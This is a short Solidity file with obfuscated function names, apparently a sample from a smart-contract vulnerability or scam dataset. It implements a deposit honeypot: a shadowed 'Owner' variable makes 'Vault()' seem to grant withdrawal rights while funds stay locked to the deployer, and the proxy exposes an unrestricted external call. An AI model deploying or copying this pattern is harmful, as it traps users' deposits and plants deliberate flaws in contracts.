pragma solidity ^0.4.24;

contract Proxy  {
    modifier _0xdfb027 { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function _0x4799ca(address _0x7dfd01) public _0xdfb027 { Owner = _0x7dfd01; }
    function _0x471ec5(address _0xfb16e7, bytes data) public payable {
        _0xfb16e7.call.value(msg.value)(data);
    }
}

contract DepositProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            _0xedd563();
        }
    }

    function _0xedd563() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function _0x334ff1(uint256 _0x687b7d) public _0xdfb027 {
        if (_0x687b7d>0 && Deposits[msg.sender]>=_0x687b7d) {
            msg.sender.transfer(_0x687b7d);
        }
    }
}